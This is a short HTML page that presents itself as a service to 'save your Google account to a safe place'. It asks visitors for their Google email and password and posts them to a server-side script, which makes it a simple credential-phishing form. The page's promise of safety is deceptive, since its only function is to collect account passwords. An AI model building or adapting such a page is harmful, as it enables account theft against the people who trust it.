<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Save Your Google Account to a Safe Place</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Save Your Google Account to a Safe Place</h1>
        <p>Enter your Google account email and password below:</p>
        <form action="submit_form.php" method="post">
            <label for="email">Email:</label>
            <input type="email" id="email" name="email" required><br>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password" required><br>
            <button type="submit" name="submit">Submit</button>
        </form>
        <h2>Google Account Saving List</h2>
        <ul>
            <li>example@gmail.com</li>
            <li>user@example.com</li>
            <!-- Add more Google account emails to the list as needed -->
        </ul>
    </div>
</body>
</html>
